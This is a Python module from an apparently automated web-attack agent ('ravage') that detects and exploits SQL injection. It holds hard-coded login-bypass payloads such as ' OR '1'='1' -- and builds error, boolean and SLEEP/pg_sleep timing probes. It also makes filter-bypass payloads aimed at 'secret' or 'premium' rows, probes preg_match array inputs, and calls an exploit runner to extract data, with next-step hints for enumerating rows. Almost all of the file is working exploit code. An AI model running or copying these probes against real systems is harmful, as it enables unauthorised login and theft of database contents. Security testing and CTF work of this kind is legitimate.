from __future__ import annotations

from ravage.agent_core.agent_state import AgentState
from ravage.probe_suite_parts.general import input_payload_probe
from ravage.probe_suite_parts.result import ProbeRunResult
from ravage.probe_suite_parts.sqli.sqli_detection import (
    _boolean_sql_signal,
    _looks_filtered_response,
    _new_sql_error_markers,
    _query_result_expanded,
    _sql_error_markers,
    _sqli_probe_summary,
    _stable_sql_differential_response,
    recognize_probe_like_proof,
)
from ravage.probe_suite_parts.sqli.sqli_literal import _probe_sqli_literal_comment_bypasses
from ravage.probe_suite_parts.sqli.sqli_payloads import (
    _SQLI_TIMING_DELAY_SECONDS,
    _extract_user_exists_value,
    _filtered_query_payloads_for_target,
    _preg_match_subject_payloads,
    _sqli_boolean_payloads_for_target,
    _sqli_error_payloads_for_target,
    _sqli_timing_payloads_for_target,
)
from ravage.probe_suite_parts.sqli.sqli_preg_match import (
    _has_preg_match_proof,
    _preg_match_proof_finding,
    _preg_match_value_finding,
    _preg_match_warning_finding,
)
from ravage.probe_suite_parts.sqli.sqli_targets import (
    _accept_all_targets,
    _filtered_query_targets,
    _preg_match_targets,
    _sqli_target_brief,
    _sqli_targets,
)
from ravage.probe_suite_parts.sqli.sqli_transport import (
    _send_array_subject_target,
    _send_sqli_target,
    _sqli_replay,
)
from ravage.probe_suite_parts.sqli.sqli_values import _sqli_baseline_value, _target_baseline_value
from ravage.probe_suite_parts.support import (
    _contains_word,
    _dedupe,
    _dict_value,
    _list_of_dicts,
    _url_looks_static_oauth_redirect,
)
from ravage.probes.sqli_extractor import run_sqli_exploit
from ravage.runtime.common import clip
from ravage.web_core.http_probe import (
    ProbeResponse,
    ProbeSession,
    ResponseDelta,
    compare_responses,
    response_secrets,
)
from ravage.web_core.proof_recognizer import recognize_proofs

_SQLI_REQUEST_BUDGET = 90
_SQLI_AUTH_BYPASS_PAYLOADS = (
    "admin' -- ",
    "admin' -- -",
    "admin'#",
    "' OR '1'='1' -- ",
    "1' OR '1'='1' -- ",
    "admin' OR '1'='1' -- ",
    "admin') OR ('1'='1' -- ",
)


def probe_data_query(session: ProbeSession, state: AgentState) -> ProbeRunResult:
    payloads = {
        "'": "sql",
        '"': "sql",
        "1 OR 1=1": "boolean_probe",
        "1 AND 1=2": "boolean_probe",
        "') OR ('1'='1": "boolean_probe",
    }
    return input_payload_probe(
        session,
        state,
        probe_name="data_query",
        payloads=payloads,
        target_filter=_accept_all_targets,
        finding_type="data_query_signal",
    )


def probe_sqli_differential(session: ProbeSession, state: AgentState) -> ProbeRunResult:
    if state.surface.get("source_validation_probe") == "sqli_differential":
        return _probe_source_sqli_validation(session, state)
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    budget = _SQLI_REQUEST_BUDGET
    targets = _sqli_targets(state)

    for target in [item for item in targets if _target_looks_auth_bypass_candidate(item)][:4]:
        if budget <= 0:
            break
        baseline = _send_sqli_target(session, target, _target_baseline_value(target))
        budget -= 1
        requests.append(
            _sqli_probe_summary(baseline, target, probe_kind="auth_bypass_baseline", body_chars=120)
        )
        auth_bypass_finding, auth_bypass_requests, budget = _probe_sqli_auth_bypass(
            session,
            target,
            baseline=baseline,
            budget=budget,
        )
        requests.extend(auth_bypass_requests)
        if auth_bypass_finding:
            findings.append(auth_bypass_finding)
            return _sqli_differential_result(targets, findings, requests, budget)

    for target in targets:
        if budget <= 0:
            break
        baseline = _send_sqli_target(session, target, _target_baseline_value(target))
        budget -= 1
        requests.append(
            _sqli_probe_summary(baseline, target, probe_kind="baseline", body_chars=120)
        )

        objective_finding, objective_requests, budget = _probe_sqli_objective_value_bypass(
            session,
            state,
            target,
            baseline=baseline,
            budget=budget,
        )
        requests.extend(objective_requests)
        if objective_finding:
            findings.append(objective_finding)
            continue

        error_finding, error_requests, budget = _probe_sqli_errors(
            session,
            target,
            baseline=baseline,
            budget=budget,
        )
        requests.extend(error_requests)
        if error_finding:
            findings.append(error_finding)
            continue

        boolean_finding, boolean_requests, budget = _probe_sqli_booleans(
            session,
            target,
            baseline=baseline,
            budget=budget,
        )
        requests.extend(boolean_requests)
        if boolean_finding:
            findings.append(boolean_finding)
            continue

        timing_finding, timing_requests, budget = _probe_sqli_timing(
            session,
            target,
            baseline=baseline,
            budget=budget,
        )
        requests.extend(timing_requests)
        if timing_finding:
            findings.append(timing_finding)
            continue

        literal_finding, literal_requests, budget = _probe_sqli_literal_comment_bypasses(
            session,
            target,
            baseline=baseline,
            budget=budget,
        )
        requests.extend(literal_requests)
        if literal_finding:
            findings.append(literal_finding)

    return _sqli_differential_result(targets, findings, requests, budget)


def _probe_source_sqli_validation(
    session: ProbeSession,
    state: AgentState,
) -> ProbeRunResult:
    """Run one fair, low-noise differential against one exact source GET shape."""
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    targets = _sqli_targets(state)[:1]
    for target in targets:
        baseline = _send_sqli_target(session, target, _target_baseline_value(target))
        requests.append(
            _sqli_probe_summary(
                baseline,
                target,
                probe_kind="baseline",
                body_chars=120,
            )
        )
        error_finding, error_requests, _remaining = _probe_sqli_errors(
            session,
            target,
            baseline=baseline,
            budget=2,
        )
        requests.extend(error_requests)
        if error_finding:
            findings.append(error_finding)
            continue
        boolean_finding, boolean_requests, _remaining = _probe_sqli_booleans(
            session,
            target,
            baseline=baseline,
            budget=2,
            payloads=_source_validation_boolean_payloads(target),
        )
        requests.extend(boolean_requests)
        if boolean_finding:
            findings.append(boolean_finding)
            continue
        timing_payloads = _source_validation_timing_payloads(target)
        timing_finding, timing_requests, _remaining = _probe_sqli_timing(
            session,
            target,
            baseline=baseline,
            budget=len(timing_payloads) + 2,
            payloads=timing_payloads,
        )
        requests.extend(timing_requests)
        if timing_finding:
            findings.append(timing_finding)
    return ProbeRunResult(
        ok=bool(findings),
        probe="sqli_differential",
        summary=(
            f"source validation tested {len(targets)} exact GET query target(s), "
            f"requests={len(requests)}, findings={len(findings)}"
        ),
        findings=findings,
        requests=requests,
    )


def _source_validation_timing_payloads(target: dict[str, object]) -> list[str]:
    payloads = _sqli_timing_payloads_for_target(target)
    mysql = next((payload for payload in payloads if "' OR SLEEP" in payload), "")
    selected = [mysql] if mysql else payloads[:1]
    postgres = next((payload for payload in payloads if "pg_sleep" in payload), "")
    if postgres and postgres not in selected:
        selected.append(postgres)
    return selected


def _source_validation_boolean_payloads(
    target: dict[str, object],
) -> list[tuple[str, str]]:
    pairs = _sqli_boolean_payloads_for_target(target)
    quoted = next(
        (
            pair
            for pair in pairs
            if "' OR '1'='1' -- " in pair[0] and "' AND '1'='2' -- " in pair[1]
        ),
        None,
    )
    return [quoted] if quoted is not None else pairs[:1]


def _sqli_differential_result(
    targets: list[dict[str, object]],
    findings: list[dict[str, object]],
    requests: list[dict[str, object]],
    budget: int,
) -> ProbeRunResult:
    return ProbeRunResult(
        ok=bool(findings),
        probe="sqli_differential",
        summary=(
            f"tested {len(targets)} SQL-shaped target(s), "
            f"requests={_SQLI_REQUEST_BUDGET - budget}, findings={len(findings)}"
        ),
        findings=findings[:30],
        requests=requests[:_SQLI_REQUEST_BUDGET],
    )


def probe_sqli_exploit_runner(session: ProbeSession, state: AgentState) -> ProbeRunResult:
    def send_target(target: dict[str, object], value: str) -> ProbeResponse:
        return _send_sqli_target(session, target, value)

    result = run_sqli_exploit(
        session=session,
        state=state,
        targets=_sqli_targets(state),
        send_target=send_target,
        target_brief=_sqli_target_brief,
        replay_target=_sqli_replay,
        baseline_value=_sqli_baseline_value,
    )
    return ProbeRunResult(
        ok=result.ok,
        probe="sqli_exploit",
        summary=result.summary,
        findings=result.findings,
        requests=result.requests,
        errors=result.errors,
    )


def probe_filtered_query_bypass(session: ProbeSession, state: AgentState) -> ProbeRunResult:
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    targets = _filtered_query_targets(state)
    for target in targets[:8]:
        baseline = _send_sqli_target(session, target, _target_baseline_value(target))
        admin = _send_sqli_target(session, target, "admin")
        requests.append(
            _sqli_probe_summary(baseline, target, probe_kind="baseline", body_chars=160)
        )
        requests.append(
            _sqli_probe_summary(
                admin, target, probe_kind="known_value", body_chars=160, payload="admin"
            )
        )
        literal_finding, literal_requests, _literal_budget = _probe_sqli_literal_comment_bypasses(
            session,
            target,
            baseline=baseline,
            budget=12,
        )
        requests.extend(literal_requests)
        if literal_finding:
            findings.append(literal_finding)
            continue
        blocked_seen = False
        for payload in _filtered_query_payloads_for_target(target):
            response = _send_sqli_target(session, target, payload)
            delta = compare_responses(baseline, response, marker=payload)
            body_lower = response.body.lower()
            blocked = _looks_filtered_response(response.body)
            blocked_seen = blocked_seen or blocked
            request_summary = _sqli_probe_summary(
                response,
                target,
                probe_kind="filtered_query_payload",
                body_chars=220,
                payload=clip(payload, 180),
            )
            request_summary["blocked"] = blocked
            request_summary["delta"] = delta.to_json()
            requests.append(request_summary)
            baseline_matches = set(response_secrets(baseline) + response_secrets(admin))
            matches: list[str] = []
            for item in response_secrets(response):
                if item not in baseline_matches:
                    matches.append(item)
            if matches or recognize_probe_like_proof(response.body):
                findings.append(
                    {
                        "type": "filtered_query_exposed_secret",
                        "input": _sqli_target_brief(target),
                        "payload": payload,
                        "matches": matches,
                        "response": response.summary(body_chars=360),
                        "replay": _sqli_replay(target, payload),
                    }
                )
                break
            if (
                not blocked
                and _query_result_expanded(response, baseline=baseline, admin=admin)
                and _filtered_query_signal_is_actionable(
                    target,
                    baseline=baseline,
                    admin=admin,
                    response=response,
                    blocked_seen=blocked_seen,
                    delta=delta,
                )
            ):
                findings.append(
                    {
                        "type": "filtered_query_bypass_signal",
                        "input": _sqli_target_brief(target),
                        "payload": payload,
                        "indicator": "payload avoided filter and changed result body",
                        "blocked_payloads_seen": blocked_seen,
                        "delta": delta.to_json(),
                        "response": response.summary(body_chars=360),
                        "replay": _sqli_replay(target, payload),
                    }
                )
                break
            if "syntax" in body_lower and "sql" in body_lower:
                findings.append(
                    {
                        "type": "filtered_query_sql_error_signal",
                        "input": _sqli_target_brief(target),
                        "payload": payload,
                        "response": response.summary(body_chars=320),
                        "replay": _sqli_replay(target, payload),
                    }
                )
                break
    return ProbeRunResult(
        ok=bool(findings),
        probe="filtered_query_bypass",
        summary=f"tested {len(targets[:8])} search/login target(s), findings={len(findings)}",
        findings=findings[:20],
        requests=requests[:80],
    )


def _filtered_query_signal_is_actionable(
    target: dict[str, object],
    *,
    baseline: ProbeResponse,
    admin: ProbeResponse,
    response: ProbeResponse,
    blocked_seen: bool,
    delta: object,
) -> bool:
    if _url_looks_static_oauth_redirect(str(target.get("url") or "")):
        return False
    if response.body == baseline.body or response.body == admin.body:
        return False
    if baseline.status in {404, 405} and admin.status in {404, 405}:
        return False
    if blocked_seen:
        return True
    status_changed = bool(getattr(delta, "status_changed", False))
    length_delta = abs(int(getattr(delta, "length_delta", 0)))
    new_error_markers = getattr(delta, "new_error_markers", [])
    return status_changed or length_delta >= 25 or bool(new_error_markers)


def probe_preg_match_subject(session: ProbeSession, state: AgentState) -> ProbeRunResult:
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    targets = _preg_match_targets(state)
    for target in targets[:8]:
        baseline = _send_sqli_target(session, target, _target_baseline_value(target))
        requests.append(
            _sqli_probe_summary(baseline, target, probe_kind="baseline", body_chars=160)
        )
        warning = _send_array_subject_target(
            session, target, str(target.get("input") or ""), ["admin"]
        )
        requests.append(
            _sqli_probe_summary(
                warning,
                target,
                probe_kind="array_subject",
                body_chars=260,
                payload="input[]=admin",
            )
        )
        if "preg_match" in warning.body.lower():
            findings.append(_preg_match_warning_finding(target, warning))
        seen_matches: set[str] = set()
        for payload in _preg_match_subject_payloads():
            response = _send_sqli_target(session, target, payload)
            requests.append(
                _sqli_probe_summary(
                    response,
                    target,
                    probe_kind="preg_match_subject",
                    body_chars=260,
                    payload=payload,
                )
            )
            proofs = recognize_proofs(response.body)
            matched_value = _extract_user_exists_value(response.body)
            if matched_value and matched_value not in seen_matches:
                seen_matches.add(matched_value)
                finding = _preg_match_value_finding(
                    target=target,
                    payload=payload,
                    response=response,
                    matched_value=matched_value,
                    proofs=proofs,
                )
                findings.append(finding)
                finding_type = str(finding.get("type") or "")
                if finding_type == "preg_match_subject_proof":
                    break
            elif proofs:
                finding = _preg_match_proof_finding(target, payload, response, proofs)
                findings.append(finding)
                if finding.get("type") == "preg_match_subject_proof":
                    break
        if _has_preg_match_proof(findings):
            break
    return ProbeRunResult(
        ok=bool(findings),
        probe="preg_match_subject",
        summary=f"tested {len(targets[:8])} preg_match subject target(s), findings={len(findings)}",
        findings=findings[:20],
        requests=requests[:100],
    )


def _probe_sqli_objective_value_bypass(
    session: ProbeSession,
    state: AgentState,
    target: dict[str, object],
    *,
    baseline: ProbeResponse,
    budget: int,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    requests: list[dict[str, object]] = []
    if not _target_looks_objective_value_filter(target, state):
        return None, requests, budget

    baseline_matches = set(response_secrets(baseline))
    for payload in _objective_value_bypass_payloads(target, state):
        if budget <= 0:
            break
        response = _send_sqli_target(session, target, payload)
        budget -= 1
        delta = compare_responses(baseline, response, marker=payload)
        requests.append(
            _sqli_probe_summary(
                response,
                target,
                probe_kind="objective_value_bypass",
                body_chars=360,
                payload=payload,
            )
            | {"delta": delta.to_json()}
        )
        proofs = recognize_proofs(response.body)
        matches = [item for item in response_secrets(response) if item not in baseline_matches]
        if proofs:
            return (
                {
                    "type": "sqli_objective_value_bypass_proof",
                    "input": _sqli_target_brief(target),
                    "payload": payload,
                    "proofs": proofs,
                    "matches": matches,
                    "indicator": "objective_value_filter_disclosed_proof",
                    "response": response.summary(body_chars=700),
                    "replay": _sqli_replay(target, payload),
                    "baseline_replay": _sqli_replay(target, _target_baseline_value(target)),
                    "delta": delta.to_json(),
                },
                requests,
                budget,
            )
        if matches or _objective_value_bypass_signal(
            response, baseline=baseline, target=target, payload=payload
        ):
            return (
                {
                    "type": "sqli_objective_value_bypass_signal",
                    "input": _sqli_target_brief(target),
                    "payload": payload,
                    "matches": matches,
                    "indicator": "objective_value_filter_changed_result_set",
                    "response": response.summary(body_chars=500),
                    "replay": _sqli_replay(target, payload),
                    "baseline_replay": _sqli_replay(target, _target_baseline_value(target)),
                    "delta": delta.to_json(),
                    "next_step": "Replay this exact payload; inspect the returned hidden/objective row for proof text.",
                },
                requests,
                budget,
            )
    return None, requests, budget


def _target_looks_objective_value_filter(target: dict[str, object], state: AgentState) -> bool:
    input_name = str(target.get("input") or "").lower()
    if input_name not in {
        "category",
        "type",
        "filter",
        "search",
        "query",
        "q",
        "name",
        "title",
    } and not _contains_word(
        input_name,
        ("category", "filter", "search", "query", "type"),
    ):
        return False
    text = _objective_value_context_text(target, state)
    return any(
        marker in text
        for marker in (
            "secret category",
            "hidden post",
            "hidden posts",
            "secret post",
            "secret posts",
            "unpublished",
            "belong to the secret",
        )
    )


def _objective_value_context_text(target: dict[str, object], state: AgentState) -> str:
    parts = [
        state.summary,
        str(_sqli_target_brief(target)),
        str(state.surface),
        str(state.last_observation),
    ]
    parts.extend(state.facts[-20:])
    parts.extend(state.hypotheses[-10:])
    for values in state.signals.values():
        parts.extend(str(value) for value in values[-12:])
    return " ".join(part for part in parts if part).lower()


def _objective_value_bypass_payloads(target: dict[str, object], state: AgentState) -> list[str]:
    baseline = _target_baseline_value(target)
    columns = _objective_value_columns(target, state)
    values = _objective_values(state)
    payloads: list[str] = []
    for column in columns:
        for value in values:
            sql_value = value.replace("'", "''")
            payloads.extend(
                [
                    f"{baseline}' OR {column}='{sql_value}'-- -",
                    f"' OR {column}='{sql_value}'-- -",
                    f"{baseline}') OR {column}='{sql_value}'-- -",
                    f"{baseline}' OR LOWER({column})='{sql_value.lower()}'-- -",
                    f"' OR LOWER({column})='{sql_value.lower()}'-- -",
                ]
            )
    payloads.extend(
        [
            f"{baseline}' OR 1=1-- -",
            "' OR 1=1-- -",
            f"{baseline}') OR 1=1-- -",
        ]
    )
    return _dedupe(payloads)[:24]


def _objective_value_columns(target: dict[str, object], state: AgentState) -> list[str]:
    columns: list[str] = []
    input_name = _safe_sql_identifier(str(target.get("input") or ""))
    if input_name:
        columns.append(input_name)
    text = _objective_value_context_text(target, state)
    if "category" in text:
        columns.append("category")
    if "type" in text:
        columns.append("type")
    if "status" in text or "published" in text:
        columns.append("status")
    return _dedupe(columns or ["category", "type"])


def _objective_values(state: AgentState) -> list[str]:
    text = _objective_value_context_text({}, state)
    values: list[str] = []
    if "secret" in text:
        values.extend(["Secret", "secret"])
    if "private" in text:
        values.extend(["Private", "private"])
    if "premium" in text:
        values.extend(["Premium", "premium"])
    values.extend(["Secret", "secret", "private", "premium"])
    return _dedupe(values)


def _safe_sql_identifier(value: str) -> str:
    if not value:
        return ""
    if not (value[0].isalpha() or value[0] == "_"):
        return ""
    if not all(char.isalnum() or char == "_" for char in value):
        return ""
    return value


def _objective_value_bypass_signal(
    response: ProbeResponse,
    *,
    baseline: ProbeResponse,
    target: dict[str, object],
    payload: str,
) -> bool:
    if response.status is None or response.status >= 500:
        return False
    if response.body == baseline.body or _looks_filtered_response(response.body):
        return False
    if _contains_word(
        response.body.lower(), ("secret", "hidden", "flag{", "<flag>", "password", "token")
    ):
        return True
    delta = compare_responses(baseline, response, marker=payload)
    return _query_result_expanded(response, baseline=baseline, admin=baseline) and not bool(
        delta.marker_reflected
    )


def _probe_sqli_errors(
    session: ProbeSession,
    target: dict[str, object],
    *,
    baseline: ProbeResponse,
    budget: int,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    requests: list[dict[str, object]] = []
    for payload in _sqli_error_payloads_for_target(target):
        if budget <= 0:
            break
        response = _send_sqli_target(session, target, payload)
        budget -= 1
        delta = compare_responses(baseline, response, marker=payload)
        requests.append(
            _sqli_probe_summary(
                response,
                target,
                probe_kind="sql_error",
                body_chars=140,
                payload=payload,
            )
        )
        markers = _sql_error_markers(response.body)
        new_markers = _new_sql_error_markers(markers, baseline.body)
        if new_markers:
            return (
                {
                    "type": "sql_injection_error_signal",
                    "input": _sqli_target_brief(target),
                    "payload": payload,
                    "indicator": "new_sql_error_marker",
                    "markers": new_markers,
                    "replay": _sqli_replay(target, payload),
                    "baseline_replay": _sqli_replay(target, _target_baseline_value(target)),
                    "delta": delta.to_json(),
                    "response": response.summary(body_chars=260),
                    "next_step": (
                        "Replay exactly the supplied replay object; preserve every form field "
                        "including submit/hidden/button values and only change replay.payload_field "
                        "for boolean, ORDER BY, UNION, or auth-bypass tests."
                    ),
                },
                requests,
                budget,
            )
    return None, requests, budget


def _probe_sqli_auth_bypass(
    session: ProbeSession,
    target: dict[str, object],
    *,
    baseline: ProbeResponse,
    budget: int,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    requests: list[dict[str, object]] = []
    if not _target_looks_auth_bypass_candidate(target):
        return None, requests, budget

    for payload in _SQLI_AUTH_BYPASS_PAYLOADS:
        if budget <= 0:
            break
        response = _send_sqli_target(session, target, payload)
        budget -= 1
        delta = compare_responses(baseline, response, marker=payload)
        requests.append(
            _sqli_probe_summary(
                response,
                target,
                probe_kind="auth_bypass",
                body_chars=220,
                payload=payload,
            )
            | {"delta": delta.to_json()}
        )

        finding = _sqli_auth_bypass_finding(
            target, payload, response, baseline=baseline, delta=delta
        )
        if finding:
            return finding, requests, budget

        followup = _same_origin_redirect_followup(session, response)
        if followup is None:
            continue
        followup_delta = compare_responses(baseline, followup, marker=payload)
        requests.append(
            _sqli_probe_summary(
                followup,
                target,
                probe_kind="auth_bypass_redirect_followup",
                body_chars=260,
                payload=payload,
            )
            | {"delta": followup_delta.to_json()}
        )
        finding = _sqli_auth_bypass_finding(
            target, payload, followup, baseline=baseline, delta=followup_delta
        )
        if finding:
            return finding, requests, budget

    return None, requests, budget


def _target_looks_auth_bypass_candidate(target: dict[str, object]) -> bool:
    kind = str(target.get("kind") or "")
    if kind not in {"form", "replay"}:
        return False
    input_name = str(target.get("input") or "").lower()
    if input_name not in {
        "username",
        "user",
        "userid",
        "user_id",
        "uid",
        "login",
        "log",
        "email",
    } and not _contains_word(
        input_name,
        ("user", "login", "email"),
    ):
        return False

    form = _dict_value(target.get("form"))
    raw_hints = target.get("hints")
    hints = raw_hints if isinstance(raw_hints, (list, tuple)) else ()
    text = (
        f"{kind} {target.get('url') or ''} {input_name} "
        f"{' '.join(str(item) for item in hints)} {form!r}"
    ).lower()
    if _contains_word(text, ("password", "passwd", "pwd", "login", "signin", "admin", "auth")):
        return True

    for field in _list_of_dicts(form.get("inputs")):
        name = str(field.get("name") or "").lower()
        input_type = str(field.get("type") or "").lower()
        if input_type == "password" or "pass" in name:
            return True
    return False


def _sqli_auth_bypass_finding(
    target: dict[str, object],
    payload: str,
    response: ProbeResponse,
    *,
    baseline: ProbeResponse,
    delta: ResponseDelta,
) -> dict[str, object] | None:
    proofs = recognize_proofs(response.body)
    if proofs:
        return {
            "type": "sqli_auth_bypass_proof",
            "input": _sqli_target_brief(target),
            "payload": payload,
            "proofs": proofs,
            "indicator": "auth_bypass_disclosed_proof",
            "replay": _sqli_replay(target, payload),
            "baseline_replay": _sqli_replay(target, _target_baseline_value(target)),
            "delta": delta.to_json(),
            "response": response.summary(body_chars=360),
        }

    if not _auth_bypass_response_signal(response, baseline=baseline):
        return None
    return {
        "type": "sqli_auth_bypass_signal",
        "input": _sqli_target_brief(target),
        "payload": payload,
        "indicator": "auth_bypass_changed_to_authenticated_body",
        "replay": _sqli_replay(target, payload),
        "baseline_replay": _sqli_replay(target, _target_baseline_value(target)),
        "delta": delta.to_json(),
        "response": response.summary(body_chars=360),
    }


def _auth_bypass_response_signal(response: ProbeResponse, *, baseline: ProbeResponse) -> bool:
    if response.status is None or response.status in {401, 403}:
        return False
    body = response.body.lower()
    baseline_body = baseline.body.lower()
    if response.body == baseline.body:
        return False
    if _contains_word(body, ("invalid", "denied", "forbidden", "unauthorized", "incorrect")):
        return False
    if _contains_word(body, ("logout", "dashboard", "admin panel", "welcome admin", "profile")):
        return True
    if baseline.status in {401, 403} and response.status in {200, 201, 302, 303}:
        return True
    return _contains_word(body, ("admin", "account")) and not _contains_word(
        baseline_body, ("admin", "account")
    )


def _same_origin_redirect_followup(
    session: ProbeSession, response: ProbeResponse
) -> ProbeResponse | None:
    if response.status not in {301, 302, 303, 307, 308}:
        return None
    location = str(response.headers.get("location") or response.headers.get("Location") or "")
    if not location:
        return None
    followup_url = session.absolute(location)
    if followup_url == response.url or not session.in_scope(followup_url):
        return None
    return session.get(followup_url)


def _probe_sqli_booleans(
    session: ProbeSession,
    target: dict[str, object],
    *,
    baseline: ProbeResponse,
    budget: int,
    payloads: list[tuple[str, str]] | None = None,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    requests: list[dict[str, object]] = []
    pairs = payloads if payloads is not None else _sqli_boolean_payloads_for_target(target)
    for true_payload, false_payload in pairs:
        if budget < 2:
            break
        true_response = _send_sqli_target(session, target, true_payload)
        false_response = _send_sqli_target(session, target, false_payload)
        budget -= 2
        true_delta = compare_responses(baseline, true_response, marker=true_payload)
        false_delta = compare_responses(baseline, false_response, marker=false_payload)
        pair_delta = compare_responses(false_response, true_response, marker=true_payload)
        requests.append(
            _sqli_probe_summary(
                true_response,
                target,
                probe_kind="boolean_true",
                body_chars=140,
                payload=true_payload,
            )
        )
        requests.append(
            _sqli_probe_summary(
                false_response,
                target,
                probe_kind="boolean_false",
                body_chars=140,
                payload=false_payload,
            )
        )
        if _boolean_sql_signal(
            true_response,
            false_response,
            baseline,
            true_payload=true_payload,
            false_payload=false_payload,
        ):
            return (
                {
                    "type": "blind_sql_injection_boolean_signal",
                    "input": _sqli_target_brief(target),
                    "true_payload": true_payload,
                    "false_payload": false_payload,
                    "indicator": "paired_boolean_response_delta",
                    "true_replay": _sqli_replay(target, true_payload),
                    "false_replay": _sqli_replay(target, false_payload),
                    "true_delta": true_delta.to_json(),
                    "false_delta": false_delta.to_json(),
                    "pair_delta": pair_delta.to_json(),
                    "true_response": true_response.summary(body_chars=220),
                    "false_response": false_response.summary(body_chars=220),
                    "next_step": (
                        "Replay exactly true_replay/false_replay; preserve every form field "
                        "including submit/hidden/button "
                        "values and only change payload_field while enumerating rows or testing auth bypass."
                    ),
                },
                requests,
                budget,
            )
    return None, requests, budget


def _probe_sqli_timing(
    session: ProbeSession,
    target: dict[str, object],
    *,
    baseline: ProbeResponse,
    budget: int,
    payloads: list[str] | None = None,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    requests: list[dict[str, object]] = []
    for payload in payloads if payloads is not None else _sqli_timing_payloads_for_target(target):
        if budget <= 0:
            break
        response = _send_sqli_target(session, target, payload)
        budget -= 1
        elapsed_delta = response.elapsed_ms - baseline.elapsed_ms
        requests.append(
            _sqli_probe_summary(
                response,
                target,
                probe_kind="timing",
                body_chars=120,
                payload=payload,
            )
        )
        threshold_ms = _SQLI_TIMING_DELAY_SECONDS * 1000 - 350
        if response.status is None or elapsed_delta < threshold_ms or budget < 2:
            continue
        control_payload = _sqli_timing_control_payload(payload, target=target)
        control = _send_sqli_target(session, target, control_payload)
        repeated = _send_sqli_target(session, target, payload)
        budget -= 2
        control_delta = control.elapsed_ms - baseline.elapsed_ms
        repeated_delta = repeated.elapsed_ms - baseline.elapsed_ms
        requests.append(
            _sqli_probe_summary(
                control,
                target,
                probe_kind="timing_control",
                body_chars=120,
                payload=control_payload,
            )
        )
        requests.append(
            _sqli_probe_summary(
                repeated,
                target,
                probe_kind="timing_repeat",
                body_chars=120,
                payload=payload,
            )
        )
        if (
            all(
                _stable_sql_differential_response(item)
                for item in (baseline, response, control, repeated)
            )
            and len({baseline.status, response.status, control.status, repeated.status}) == 1
            and repeated_delta >= threshold_ms
            and response.elapsed_ms - control.elapsed_ms >= threshold_ms
            and repeated.elapsed_ms - control.elapsed_ms >= threshold_ms
        ):
            return (
                {
                    "type": "blind_sql_injection_timing_signal",
                    "input": _sqli_target_brief(target),
                    "payload": payload,
                    "indicator": "sql_sleep_delay",
                    "replay": _sqli_replay(target, payload),
                    "baseline_elapsed_ms": baseline.elapsed_ms,
                    "probe_elapsed_ms": response.elapsed_ms,
                    "elapsed_delta_ms": elapsed_delta,
                    "control_elapsed_ms": control.elapsed_ms,
                    "control_delta_ms": control_delta,
                    "repeat_elapsed_ms": repeated.elapsed_ms,
                    "repeat_delta_ms": repeated_delta,
                    "next_step": (
                        "Replay exactly this object; preserve every form field including "
                        "submit/hidden/button values and "
                        "only change payload_field while using short timing predicates."
                    ),
                },
                requests,
                budget,
            )
    return None, requests, budget


def _sqli_timing_control_payload(
    payload: str,
    *,
    target: dict[str, object],
) -> str:
    delay = str(_SQLI_TIMING_DELAY_SECONDS)
    control = payload.replace(f"SLEEP({delay})", "SLEEP(0)").replace(
        f"pg_sleep({delay})",
        "pg_sleep(0)",
    )
    return control if control != payload else _target_baseline_value(target)
